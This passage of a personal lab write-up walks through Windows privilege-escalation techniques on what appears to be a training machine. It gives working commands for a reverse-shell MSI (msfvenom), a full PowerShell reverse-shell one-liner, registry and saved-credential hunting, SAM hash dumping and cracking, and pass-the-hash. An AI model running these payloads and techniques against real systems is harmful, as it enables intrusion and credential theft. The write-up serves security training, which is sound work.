- Simply run `accesschk.exe \accepteula -wvu "<path>"`, i ran that for **My Program** autorun's path and the output statted `FILE_ALL_ACCESS`, so we can literally do anything in this folder. Mainly we can replace the original executable and restart the system and we can get the shell.
- No we need to wait till the admin login and we'll get the shell as privileges user!
- The catch here is that we need to wait till admin/owner logins or else we're good to go!

---

#### AlwaysInstallElevated

- It allows standard user to install **msi**(Microsoft Installer) with adminsitrative privileges.
- This is cool and easy to obtain higher privileges,
- We can check thet by running, `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  and `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- Run both these commands and the value for **AlwaysInstallElevated** must be 1 or 0x1. So that we can confirm and proceed along.
- Now create a reverse-shell of format **msi** for reference check the below command, `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.39.50 LPORT=4444 --platform windows -f msi > reverse.msi`
- Now transfer that to windows machine and run the command, `msiexec /quiet /qn /i reverse.msi`
- Hurray! we got the shell as `nt authority\system`

---

### Passwords:

- Here we look for credentials in registry, files...etc
- And we'll try to login!

---

#### Looking for passwords in Registry:

- We can search registry for passwords, sometimes we can find other user's passwords or even owner's password.
- Run `reg query HKLM /f password /t REG_SZ /s` this gives all the details in registry which contains **password** string, search and you might find it! But the sad part is I was unable to obtain any!
- Also run `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"` , we might find some information.
- We can also make use of our legendary tool **winPEAS** run with some options like `windowscreds` - looks for credentials, also `filesinfo` - looks into files and registry for useful data(sometimes passwords also)
- After obtaining password here it's `password123`, so now lets login with the help of **psexec**(link: [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)) and the syntax is `python3 psexec.py admin@10.10.150.253` then it'll prompt for password mention it and we'll get access like admin!

---

#### Passwords : Savedcreds

- First of all run `cmdkey /list`, here **cmdkey** is an windows-server application that _Creates, lists, and deletes stored user names and passwords or credentials_. By running this we can see what are all the credentials of users saved!
- Th output is,

```
Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02nfpgrklkitqatu
    Local machine persistence
    
    Target: Domain:interactive=WIN-QBA94KB3IOF\admin
    Type: Domain Password
    User: WIN-QBA94KB3IOF\admin
```

- We can see the user **admin** so lets make use of **runas** utility. _It allows a user to run specific tools and programs with different permissions than the user's current logon provides._
- lets run `runas /savecred /user:admin C:\Temp\reverse.exe`, this will give us the admin privileges

---

#### Passwords: SAM(Security Accounts manager)

- SAM consists of NTLM hashes of windows passwords, we have chance to crack them but this might not always be helpful because we're dealing with hashes!
- But knowing the method will definitely helps.
- And 99% of the times SAM file cannot be accessed with normal privileges, but here in the box the author created a copy of SAM file in `C:\Windows\Repair` directory, so that we can play! Here in that directory there are 2 files namely, `SAM` and `SYSTEM`
- We need to get both the files so that we can use with a tool named **creddump7**([https://github.com/CiscoCXSecurity/creddump7](https://github.com/CiscoCXSecurity/creddump7)). I got them thru the help of meterpreter `download` command
- Now after cloning run the following command `python2 pwdump.py /opt/work/SYSTEM /opt/work/SAM` it'll now display the hashes of users that are available in windows machine. The output is,

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
```

- Now save the above content in a text file and now crack it with the help of **JohnTheRipper**, the syntax is `john --format=NT hashes.txt --wordlist=/usr/share/wordlist/rockyou.txt`, and it cracked!

```
password123      (admin)     
password321      (user)     
Passw0rd!        (Administrator)  
```

---

#### Password: Pass the hash attack

- Lets assume that we are not able to crack the hash as its not in the wordlist, then we can use this attack **Pass the hash**, which allows us to authenticate with the help of hash!
- So get the hash, here lets login as **admin** whose hash is `a9fdfa038c4b75ebc76dc855dd74f0da`
- First export, `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da` here we're using hash with groupid as well
- Then run `pth-winexe -U admin% //10.10.213.97 cmd.exe`, I got shell as **admin**
- The tool `pth-winexe` is already available in kali.
- If stuck check this: [https://www.whitelist1.com/2017/10/pass-hash-pth-attack-with-pth-winexe.html](https://www.whitelist1.com/2017/10/pass-hash-pth-attack-with-pth-winexe.html)

---

### Exploiting Scheduled tasks:

- Like in Linux there are schedules tasks in windows as well.
- To view all the schedules tasks run `schtasks /query /fo LIST /V`
- Here `CleanUp.ps1` seems interesting and the path is `C:\DevTools\CleanUp.ps1`
- So lets see what we can do this location as well as to that file, `accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1` and we have all the privileges to read, write...etc
- The process in the description of task is bit different so I looked for a powershell-reverseshell, which is,

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

- Then I transferred and renamed as `CleanUp.ps1` and I got connection.

---

### Insecure GUI apps:

- After getting RDP connection open `Taskmanager` and there in `Details` tab we can see the applications and the user, who's running that.
- Here they intentionally configured `mspaint.exe` to run as admin, so this will be out target.
- As we're working with **Paint** we'll have an option to open files, so we'll open `file://c:/windows/system32/cmd.exe` and boom! We go the shell as **admin** user!
- Here the functionality is bit limited coz we might not always get an RDP connection.

---

### Startup Apps:

- Windows has a feature to allow some apps to run in Startup, we can abuse this feature.
- Startup apps are found in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`, this is default path.
- Lets check what we can do thru **accesschk.exe**, so run `accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`. The output is,

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW WIN-QBA94KB3IOF\Administrator
  RW WIN-QBA94KB3IOF\admin
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
  R  Everyone
```

- Here there's a script called `CreateShortcut.vbs` which runs with admin priviliges and the mail aim of this is to create a `shortcut` for the reverse-shell which we uploaded.
- Transfer payload and run the script now we need to wait till admin logins and then we'll get the shell.
- This is rare and chance of exploiting thru this is less.

---

### Token Impersonation:

- Tokens are like cookies for computer, the benfit is that we dont need to mention credentials everytime inorder to connect to any network...etc
- There are 2 types of tokens,

1. Delegate token: created for logging into a machine or using a RDP
2. Impersonate toke: Non-interactive, used for attaching network dirve or a domain logon script.

- We can see all the token by running `list_tokens -u` that too in meterpreter session, later after finding some cool token then run `impersonate_token <name of token>`
- Also we can run `whomai /priv` and we can see the privileges to current user, there if we can find some privilege like `SeAssignPrimaryToken`...etc which are kind of dangerous, this is so dangerous! To know more about these privileges and how to exploit them check this article: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)

---

#### Potato Attacks:

- Guide for this attacks is: [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
- And the payload which we can use is: [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
- Here we try to gain access like `NT Authority/System` [Still in progress.....]
